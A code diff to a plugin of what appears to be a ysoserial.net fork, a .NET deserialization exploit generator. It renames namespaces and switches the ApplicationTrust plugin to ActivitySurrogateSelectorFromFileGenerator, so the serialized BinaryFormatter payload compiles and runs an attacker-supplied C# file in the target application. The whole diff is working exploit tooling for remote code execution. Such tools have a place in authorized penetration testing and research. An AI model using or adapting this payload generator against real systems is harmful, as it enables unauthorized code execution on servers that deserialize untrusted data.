@@ -1,7 +1,7 @@
 ﻿using System.Collections.Generic;
 using NDesk.Options;
 using System;
-using ysoserial.Generators;
+using ysoserial_frmv2.Generators;
 
 /**
  * Author: Soroush Dalili (@irsdl) from NCC Group (@NCCGroupInfosec)
@@ -14,7 +14,7 @@ using ysoserial.Generators;
  *  This PoC produces an error and may crash the application
  **/
 
-namespace ysoserial.Plugins
+namespace ysoserial_frmv2.Plugins
 {
     class ApplicationTrustPlugin : Plugin
     {
@@ -23,7 +23,7 @@ namespace ysoserial.Plugins
 
         static OptionSet options = new OptionSet()
             {
-                {"c|command=", "the command to be executed", v => command = v },
+                {"c|command=", "the command to be executed using ActivitySurrogateSelectorFromFileGenerator e.g. \"ExploitClass.cs; System.Windows.Forms.dll\"", v => command = v },
                 {"t|test", "whether to run payload locally. Default: false", v => test =  v != null },
             };
 
@@ -70,7 +70,7 @@ namespace ysoserial.Plugins
 -->
 </ApplicationTrust>
 ";
-            if (String.IsNullOrEmpty(command) || String.IsNullOrWhiteSpace(command))
+            if (String.IsNullOrEmpty(command) || String.IsNullOrEmpty(command.Trim()))
             {
                 Console.Write("ysoserial: ");
                 Console.WriteLine("Incorrect plugin mode/arguments combination");
@@ -78,7 +78,7 @@ namespace ysoserial.Plugins
                 System.Environment.Exit(-1);
             }
 
-            byte[] osf = (byte[])new TypeConfuseDelegateGenerator().Generate(command, "BinaryFormatter", false);
+            byte[] osf = (byte[])new ActivitySurrogateSelectorFromFileGenerator().Generate(command, "BinaryFormatter", false);
             payloadValue = BitConverter.ToString(osf).Replace("-", string.Empty);
             payload = String.Format(payload, payloadValue);
 
